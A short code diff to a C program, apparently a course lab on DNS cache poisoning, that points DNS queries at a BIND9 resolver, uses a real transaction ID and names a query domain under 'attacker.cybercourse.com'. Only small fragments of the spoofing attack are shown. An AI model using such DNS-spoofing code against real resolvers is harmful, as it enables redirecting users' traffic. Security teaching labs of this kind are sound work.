@@ -15,11 +15,6 @@
 #define QUERY_DOMAIN "www.attacker.cybercourse.com"
 // Function to create a DNS response packet
 
-#include <ldns/ldns.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-
 
 int send_txid(int client_sock, uint32_t txid, uint16_t source_port);
 
@@ -78,7 +73,6 @@ int build_dns_query(unsigned char *buffer, const char *hostname, uint32_t tid) {
 int create_dns_response(uint32_t txid, const char* query_name){
         // connect to server attacker
     int sockfd1;
-    char txid_buffer[BUFFER_SIZE];
     // send the DNS request  ################ step 1 #####################
     const char *hostname = query_name;
     int sockfd;
@@ -94,11 +88,11 @@ int create_dns_response(uint32_t txid, const char* query_name){
     // Step 2: Configure the DNS server address
     memset(&server_addr, 0, sizeof(server_addr));
     server_addr.sin_family = AF_INET;
-    server_addr.sin_port = htons(DNS_SERVER_PORT);
-    inet_pton(AF_INET, DNS_SERVER_IP, &server_addr.sin_addr);
+    server_addr.sin_port = htons(SERVER_PORT);
+    inet_pton(AF_INET, BIND9_IP, &server_addr.sin_addr);
     printf("step 2 done\n");
     // Step 3: Build the DNS query
-    int query_len = build_dns_query(buffer, hostname, 1234);
+    int query_len = build_dns_query(buffer, hostname, txid);
     printf("step 3 done\n");
     printf("buffer: %s\n", buffer);
     // Step 4: Send the DNS query
